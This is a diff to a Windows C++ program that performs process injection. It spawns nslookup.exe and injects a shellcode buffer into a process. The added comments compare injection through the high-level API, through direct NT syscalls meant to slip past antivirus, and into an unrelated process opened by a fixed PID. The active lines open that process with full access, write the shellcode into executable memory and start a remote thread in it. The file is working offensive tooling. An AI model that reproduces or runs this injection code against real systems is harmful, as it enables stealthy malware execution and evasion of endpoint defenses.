@@ -187,14 +187,34 @@ int main(int argc, char* argv[]) {
 	}
 	WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize.
 
+	
+											
+	/* this code will inject into remote process that we did create (nslookup.exe from above) using high level API functions (just for testing, will get detected by AV)*/
+	
 	//allocation_start = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	//WriteProcessMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), NULL);
 	//CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
 
+	
+	
+	/* this code will inject into remote process that we did create (nslookup.exe from above) using direct syscalls */
+	
+	//allocation_start = nullptr;
+	//NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
+	//NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+	
+	
+	
+	/* this code will inject into a remote process that we didnt start given PID */
+	
+	HANDLE procHandle;
+	procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 11108);
+
 	allocation_start = nullptr;
-	NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
-	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
+	NtAllocateVirtualMemory(procHandle, &allocation_start, 0, (PULONG)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	NtWriteVirtualMemory(procHandle, allocation_start, shellcode, sizeof(shellcode), 0);
+	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, procHandle, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
 
 	return 0;
 }
